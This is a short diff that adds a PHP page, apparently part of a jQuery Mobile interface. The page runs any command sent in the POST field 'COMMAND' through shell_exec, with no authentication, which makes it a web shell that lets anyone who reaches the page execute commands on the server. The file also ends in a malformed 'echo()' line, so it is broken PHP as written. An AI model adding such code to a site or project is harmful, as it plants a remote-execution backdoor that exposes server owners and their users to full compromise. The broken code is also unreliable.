@@ -1,0 +1,11 @@
+<?
+
+$command = $_POST['COMMAND'];
+if ($command)
+    $return_value = shell_exec($command);
+
+?>
+
+<div data-role="content">
+<?php echo()
+</div>
